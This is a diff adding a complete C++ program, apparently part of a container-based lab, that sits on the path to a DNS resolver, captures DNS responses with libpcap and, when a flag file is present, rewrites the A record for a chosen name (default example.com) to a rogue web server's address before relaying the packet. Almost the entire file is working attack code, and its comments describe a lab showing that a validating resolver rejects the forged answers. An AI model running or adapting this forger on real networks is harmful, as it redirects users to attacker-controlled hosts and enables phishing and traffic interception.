@@ -1,0 +1,440 @@
+/*
+ * dns_interceptor.cpp — Phase 2 on-path DNS response forger.
+ *
+ * Sits on the resolver subnet. core-router's one diversion route sends
+ * every packet addressed to the resolver (172.16.2.10) through this
+ * container instead of delivering it directly -- this is the ONLY
+ * mechanism that gets traffic here; there is no ARP spoofing anywhere.
+ *
+ * ip_forward is left OFF on this container, so nothing reaches the
+ * resolver unless THIS program explicitly relays it: every captured
+ * packet is retransmitted out the same interface, with the Ethernet
+ * destination corrected to the resolver's real MAC.
+ *
+ * The resolver's MAC is re-resolved periodically in a background
+ * thread (not just once at startup): anything that recreates or
+ * restarts the resolver container -- e.g. `docker compose restart
+ * resolver` before an attack run, as the README's own workflow calls
+ * for -- can change its MAC on the bridge. A stale cached MAC makes
+ * every relayed frame silently undeliverable at L2, which looks like
+ * total DNS failure (SERVFAIL/timeout) with nothing in any log,
+ * completely independent of forging.
+ *
+ * Unchanged from Phase 2, per the Phase 3 spec: "Leave the attacker
+ * and its Phase 2 binary unchanged." Phase 3 adds a cryptographic
+ * chain of trust on the authoritative/resolver side only; this
+ * interceptor still forges exactly the same way it did in Phase 2 --
+ * the point of Phase 3 is to show that a validating resolver now
+ * rejects the result even though the interception itself is identical.
+ *
+ * For the final A-record answer to "example.com" specifically, when
+ * forging is enabled, the 4 RDATA bytes are overwritten to point at
+ * rogue-web instead. Every other packet is relayed with no change to
+ * its DNS content at all.
+ *
+ * Build: g++ -O2 -std=c++17 -Wall -o dns_interceptor dns_interceptor.cpp -lpcap -lpthread
+ * Usage: ./dns_interceptor <iface>
+ *   RESOLVER_MAC env var ("aa:bb:cc:dd:ee:ff") -- required (seed value;
+ *                refreshed automatically afterward).
+ *   RESOLVER_IP  env var -- default "172.16.2.10".
+ *   TARGET_NAME  env var -- default "example.com".
+ *   ROGUE_IP     env var -- default "172.16.1.30".
+ */
+
+#include <array>
+#include <cctype>
+#include <chrono>
+#include <cstdint>
+#include <cstdio>
+#include <cstdlib>
+#include <cstring>
+#include <mutex>
+#include <optional>
+#include <string>
+#include <thread>
+#include <vector>
+
+#include <arpa/inet.h>
+#include <net/if.h>
+#include <netinet/in.h>
+#include <sys/ioctl.h>
+#include <sys/socket.h>
+#include <sys/stat.h>
+#include <unistd.h>
+
+#include <pcap.h>
+
+namespace {
+
+constexpr int ETH_HDR_LEN = 14;
+constexpr const char *FORGE_FLAG_PATH = "/tmp/forge.on";
+constexpr size_t MAX_PACKET_SIZE = 2048;
+
+using MacAddr = std::array<uint8_t, 6>;
+
+#pragma pack(push, 1)
+struct EthHdr {
+    uint8_t  dst[6];
+    uint8_t  src[6];
+    uint16_t ethertype;
+};
+struct IpHdr {
+    uint8_t  ver_ihl;
+    uint8_t  tos;
+    uint16_t tot_len;
+    uint16_t id;
+    uint16_t frag_off;
+    uint8_t  ttl;
+    uint8_t  proto;
+    uint16_t checksum;
+    uint32_t src;
+    uint32_t dst;
+};
+struct UdpHdr { uint16_t sport, dport, len, checksum; };
+struct DnsHdr { uint16_t id, flags, qdcount, ancount, nscount, arcount; };
+#pragma pack(pop)
+
+MacAddr     g_own_mac{};
+std::mutex  g_resolver_mac_mu;
+MacAddr     g_resolver_mac{};
+std::string g_target_name = "example.com";
+uint32_t    g_rogue_ip_net = 0;   // network byte order
+pcap_t     *g_pcap = nullptr;
+
+MacAddr get_resolver_mac() {
+    std::lock_guard<std::mutex> lk(g_resolver_mac_mu);
+    return g_resolver_mac;
+}
+
+void set_resolver_mac(const MacAddr &m) {
+    std::lock_guard<std::mutex> lk(g_resolver_mac_mu);
+    g_resolver_mac = m;
+}
+
+// ---------- helpers ----------
+
+std::optional<MacAddr> parse_mac(const std::string &s) {
+    unsigned int b[6];
+    if (sscanf(s.c_str(), "%x:%x:%x:%x:%x:%x", &b[0],&b[1],&b[2],&b[3],&b[4],&b[5]) != 6)
+        return std::nullopt;
+    MacAddr out{};
+    for (int i = 0; i < 6; i++) out[i] = static_cast<uint8_t>(b[i]);
+    return out;
+}
+
+std::optional<MacAddr> get_own_mac(const std::string &iface) {
+    int fd = socket(AF_INET, SOCK_DGRAM, 0);
+    if (fd < 0) return std::nullopt;
+    struct ifreq ifr{};
+    std::strncpy(ifr.ifr_name, iface.c_str(), IFNAMSIZ - 1);
+    if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0) { close(fd); return std::nullopt; }
+    MacAddr out{};
+    std::memcpy(out.data(), ifr.ifr_hwaddr.sa_data, 6);
+    close(fd);
+    return out;
+}
+
+// Internet checksum (RFC 1071) over an array of 16-bit words already in
+// network byte order: convert each to host order to sum, then convert
+// the complemented sum back to network order for storage. This is the
+// textbook formulation -- explicit at every step, no reliance on
+// endianness symmetry tricks.
+uint16_t checksum_words(const uint16_t *buf, int nwords) {
+    uint32_t sum = 0;
+    for (int i = 0; i < nwords; i++) sum += ntohs(buf[i]);
+    while (sum >> 16) sum = (sum & 0xFFFF) + (sum >> 16);
+    uint16_t result = static_cast<uint16_t>(~sum);
+    return htons(result == 0 ? 0xFFFF : result);
+}
+
+uint16_t ip_checksum(IpHdr ip /* by value: checksum field zeroed locally */) {
+    ip.checksum = 0;
+    return checksum_words(reinterpret_cast<uint16_t *>(&ip), sizeof(ip) / 2);
+}
+
+uint16_t udp_checksum(const IpHdr &ip, const UdpHdr &udp,
+                       const uint8_t *payload, int paylen) {
+    struct Pseudo {
+        uint32_t src, dst;
+        uint8_t  zero, proto;
+        uint16_t udplen;
+    } __attribute__((packed));
+
+    int total = static_cast<int>(sizeof(Pseudo)) + ntohs(udp.len);
+    int padded = (total + 1) & ~1; // even length for whole-word summing
+    std::vector<uint8_t> buf(padded, 0);
+
+    Pseudo ph{ip.src, ip.dst, 0, 17 /* UDP */, udp.len};
+    std::memcpy(buf.data(), &ph, sizeof(ph));
+
+    UdpHdr udp_copy = udp;
+    udp_copy.checksum = 0;
+    std::memcpy(buf.data() + sizeof(ph), &udp_copy, sizeof(udp_copy));
+
+    if (paylen > 0)
+        std::memcpy(buf.data() + sizeof(ph) + sizeof(udp_copy), payload, paylen);
+
+    return checksum_words(reinterpret_cast<uint16_t *>(buf.data()), padded / 2);
+}
+
+// Skip one DNS name at buf+offset (compression pointer or ordinary
+// labels). Returns bytes consumed, or -1 if malformed.
+int dns_name_len(const uint8_t *buf, int offset, int buflen) {
+    const int start = offset;
+    while (offset < buflen) {
+        uint8_t b = buf[offset];
+        if ((b & 0xC0) == 0xC0) {
+            if (offset + 2 > buflen) return -1;
+            return (offset - start) + 2;
+        } else if (b == 0) {
+            return (offset - start) + 1;
+        } else if ((b & 0xC0) == 0) {
+            if (offset + 1 + b > buflen) return -1;
+            offset += 1 + b;
+        } else {
+            return -1;
+        }
+    }
+    return -1;
+}
+
+// Decode the (uncompressed) question-section QNAME into a lowercase
+// dotted string. Returns bytes consumed, or -1 on error.
+int decode_qname(const uint8_t *buf, int offset, int buflen, std::string &out) {
+    const int start = offset;
+    out.clear();
+    while (offset < buflen) {
+        uint8_t b = buf[offset];
+        if (b == 0) { offset += 1; break; }
+        if ((b & 0xC0) == 0xC0) return -1; // not expected in a question
+        if (offset + 1 + b > buflen) return -1;
+        if (!out.empty()) out += '.';
+        for (int i = 0; i < b; i++)
+            out += static_cast<char>(std::tolower(buf[offset + 1 + i]));
+        offset += 1 + b;
+    }
+    return offset - start;
+}
+
+bool forging_is_on() {
+    struct stat st;
+    return stat(FORGE_FLAG_PATH, &st) == 0;
+}
+
+// Re-resolve the resolver's current MAC via the kernel's neighbor
+// table. Plain `ping` alone is not enough to force this: if the
+// kernel's neighbor entry is STALE (pointing at a now-dead MAC after
+// the resolver container was recreated), the NUD state machine tries
+// re-confirming that *same old* MAC via unicast first and can sit on
+// the stale entry for a while before it ever falls back to a fresh
+// broadcast ARP request -- so a single ping's 1s timeout can return
+// before the entry actually updates. `arping` sends a broadcast ARP
+// request directly, bypassing that unicast-reconfirmation step, which
+// is why entrypoint.sh's own initial priming already paired the two;
+// this refresher does the same, just repeated for the life of the
+// process instead of once at startup.
+std::optional<MacAddr> resolve_resolver_mac(const std::string &iface,
+                                             const std::string &resolver_ip) {
+    std::string ping_cmd = "ping -c1 -W1 " + resolver_ip + " >/dev/null 2>&1";
+    if (std::system(ping_cmd.c_str()) != 0) { /* best-effort refresh; fall through regardless */ }
+    std::string arping_cmd = "arping -c1 -w1 -I " + iface + " " + resolver_ip + " >/dev/null 2>&1";
+    if (std::system(arping_cmd.c_str()) != 0) { /* best-effort refresh; fall through regardless */ }
+
+    // Deliberately NOT "ip neigh show <ip> dev <iface>": filtering by
+    // device drops the "dev <iface>" tokens from the printed line
+    // (just "<ip> lladdr <mac> <state>", 4 fields), shifting the MAC
+    // from $5 to $3. Matching entrypoint.sh's own unfiltered form
+    // keeps the 5-field layout ("<ip> dev <iface> lladdr <mac>
+    // <state>") that $5 actually expects.
+    std::string cmd = "ip neigh show " + resolver_ip +
+                       " 2>/dev/null | awk '{print $5}' | head -n1";
+    FILE *fp = popen(cmd.c_str(), "r");
+    if (!fp) return std::nullopt;
+    char buf[64] = {0};
+    char *line = fgets(buf, sizeof(buf), fp);
+    pclose(fp);
+    if (!line) return std::nullopt;
+    std::string s(buf);
+    while (!s.empty() && (s.back() == '\n' || s.back() == '\r')) s.pop_back();
+    if (s.empty()) return std::nullopt;
+    return parse_mac(s);
+}
+
+// Runs for the life of the process: keeps g_resolver_mac current so a
+// resolver container restart/recreate (which can change its MAC)
+// doesn't permanently blackhole every relayed frame at L2.
+void resolver_mac_refresher(std::string iface, std::string resolver_ip) {
+    while (true) {
+        std::this_thread::sleep_for(std::chrono::seconds(2));
+        auto mac = resolve_resolver_mac(iface, resolver_ip);
+        if (!mac) continue;
+        if (*mac != get_resolver_mac()) {
+            char hex[32];
+            snprintf(hex, sizeof(hex), "%02x:%02x:%02x:%02x:%02x:%02x",
+                     (*mac)[0], (*mac)[1], (*mac)[2], (*mac)[3], (*mac)[4], (*mac)[5]);
+            fprintf(stderr, "[attacker] resolver MAC changed -> %s\n", hex);
+            set_resolver_mac(*mac);
+        }
+    }
+}
+
+// ---------- per-packet handling ----------
+
+void handle_packet(u_char *, const struct pcap_pkthdr *h, const u_char *bytes) {
+    const size_t min_len = ETH_HDR_LEN + sizeof(IpHdr) + sizeof(UdpHdr) + sizeof(DnsHdr);
+    if (h->caplen < min_len || h->caplen > MAX_PACKET_SIZE) return;
+
+    uint8_t pkt[MAX_PACKET_SIZE];
+    std::memcpy(pkt, bytes, h->caplen);
+    const int caplen = static_cast<int>(h->caplen);
+
+    auto *eth = reinterpret_cast<EthHdr *>(pkt);
+    if (ntohs(eth->ethertype) != 0x0800) return; // IPv4 only
+
+    auto *ip = reinterpret_cast<IpHdr *>(pkt + ETH_HDR_LEN);
+    const int ihl = (ip->ver_ihl & 0x0F) * 4;
+    if (ip->proto != 17) return; // UDP only
+
+    auto *udp = reinterpret_cast<UdpHdr *>(pkt + ETH_HDR_LEN + ihl);
+    uint8_t *dns_start = pkt + ETH_HDR_LEN + ihl + sizeof(UdpHdr);
+
+    const int udp_declared_len = ntohs(udp->len);
+    const int captured_avail   = caplen - static_cast<int>(ETH_HDR_LEN + ihl + sizeof(UdpHdr));
+    int dns_len = udp_declared_len - static_cast<int>(sizeof(UdpHdr));
+    if (dns_len < 0 || dns_len > captured_avail) dns_len = captured_avail;
+    if (dns_len < static_cast<int>(sizeof(DnsHdr))) return;
+
+    auto *dns = reinterpret_cast<DnsHdr *>(dns_start);
+    const uint16_t flags = ntohs(dns->flags);
+    const bool qr = (flags >> 15) & 1;
+    const int ancount = ntohs(dns->ancount);
+    const int qdcount = ntohs(dns->qdcount);
+
+    auto send_it = [&]() {
+        const MacAddr resolver_mac = get_resolver_mac();
+        std::memcpy(eth->dst, resolver_mac.data(), 6);
+        std::memcpy(eth->src, g_own_mac.data(), 6);
+        ip->checksum  = ip_checksum(*ip);
+        udp->checksum = udp_checksum(*ip, *udp, dns_start, dns_len);
+        pcap_inject(g_pcap, pkt, caplen);
+    };
+
+    if (!qr || qdcount < 1) { send_it(); return; }
+
+    int off = sizeof(DnsHdr);
+    std::string qname;
+    const int namelen = decode_qname(dns_start, off, dns_len, qname);
+    bool is_target = false;
+    if (namelen > 0) {
+        off += namelen;
+        if (off + 4 <= dns_len) {
+            const int qtype = (dns_start[off] << 8) | dns_start[off + 1];
+            off += 4; // QTYPE + QCLASS
+            if (qtype == 1 /* A */ && strcasecmp(qname.c_str(), g_target_name.c_str()) == 0)
+                is_target = true;
+        }
+    }
+
+    if (is_target && ancount >= 1 && forging_is_on()) {
+        int aoff = off;
+        for (int i = 0; i < ancount && aoff < dns_len; i++) {
+            const int nlen = dns_name_len(dns_start, aoff, dns_len);
+            if (nlen < 0) break;
+            const int rhdr = aoff + nlen;
+            if (rhdr + 10 > dns_len) break;
+            const uint16_t rtype  = (dns_start[rhdr] << 8) | dns_start[rhdr + 1];
+            const uint16_t rclass = (dns_start[rhdr + 2] << 8) | dns_start[rhdr + 3];
+            const uint16_t rdlen  = (dns_start[rhdr + 8] << 8) | dns_start[rhdr + 9];
+            const int rdata_off = rhdr + 10;
+            if (rtype == 1 && rclass == 1 && rdlen == 4 && rdata_off + 4 <= dns_len) {
+                std::memcpy(dns_start + rdata_off, &g_rogue_ip_net, 4);
+                fprintf(stderr, "[forge] %s A -> rogue-web (txid 0x%04x)\n", qname.c_str(), ntohs(dns->id));
+                break;
+            }
+            aoff = rdata_off + rdlen;
+        }
+    }
+
+    send_it();
+}
+
+} // namespace
+
+int main(int argc, char **argv) {
+    if (argc < 2) {
+        fprintf(stderr, "usage: %s <iface>\n", argv[0]);
+        return 1;
+    }
+    const std::string iface = argv[1];
+
+    const char *mac_env = getenv("RESOLVER_MAC");
+    if (!mac_env) {
+        fprintf(stderr, "RESOLVER_MAC env var missing (expected aa:bb:cc:dd:ee:ff)\n");
+        return 1;
+    }
+    auto resolver_mac = parse_mac(mac_env);
+    if (!resolver_mac) {
+        fprintf(stderr, "RESOLVER_MAC invalid: %s\n", mac_env);
+        return 1;
+    }
+    set_resolver_mac(*resolver_mac);
+
+    const char *resolver_ip_env = getenv("RESOLVER_IP");
+    const std::string resolver_ip = resolver_ip_env ? resolver_ip_env : "172.16.2.10";
+
+    auto own_mac = get_own_mac(iface);
+    if (!own_mac) {
+        fprintf(stderr, "could not read MAC of %s\n", iface.c_str());
+        return 1;
+    }
+    g_own_mac = *own_mac;
+
+    if (const char *target = getenv("TARGET_NAME")) g_target_name = target;
+
+    const char *rogue = getenv("ROGUE_IP");
+    if (!rogue) rogue = "172.16.1.30";
+    struct in_addr a{};
+    if (inet_aton(rogue, &a) == 0) {
+        fprintf(stderr, "invalid ROGUE_IP %s\n", rogue);
+        return 1;
+    }
+    g_rogue_ip_net = a.s_addr;
+
+    char errbuf[PCAP_ERRBUF_SIZE];
+    // A short (1ms) read timeout keeps our relay latency minimal -- a
+    // longer timeout batches captured packets in the kernel ring
+    // buffer before handing them to us, and that extra delay can be
+    // enough for BIND's own query to have already timed out and moved
+    // on to a fresh attempt (with a new transaction ID) by the time we
+    // relay the answer to the one it already abandoned.
+    g_pcap = pcap_open_live(iface.c_str(), 65535, 1 /*promisc*/, 1 /*ms*/, errbuf);
+    if (!g_pcap) {
+        fprintf(stderr, "pcap_open_live(%s): %s\n", iface.c_str(), errbuf);
+        return 1;
+    }
+
+    struct bpf_program fp;
+    const std::string filter_str =
+        "ip and udp and src port 53 and dst host " + resolver_ip;
+    // optimize=0: skip libpcap's BPF optimizer. Some kernel/libpcap
+    // combinations have had bugs where the optimizer miscompiles
+    // compound filters like this one, causing it to match
+    // inconsistently rather than failing outright or working cleanly.
+    if (pcap_compile(g_pcap, &fp, filter_str.c_str(), 0, PCAP_NETMASK_UNKNOWN) < 0 ||
+        pcap_setfilter(g_pcap, &fp) < 0) {
+        fprintf(stderr, "BPF filter error: %s\n", pcap_geterr(g_pcap));
+        return 1;
+    }
+    pcap_freecode(&fp);
+
+    std::thread refresher(resolver_mac_refresher, iface, resolver_ip);
+    refresher.detach();
+
+    fprintf(stderr, "[attacker] up on %s, target=%s, rogue=%s, resolver=%s, forging=%s\n",
+            iface.c_str(), g_target_name.c_str(), rogue, resolver_ip.c_str(),
+            forging_is_on() ? "ON" : "OFF");
+
+    pcap_loop(g_pcap, -1, handle_packet, nullptr);
+    pcap_close(g_pcap);
+    return 0;
+}
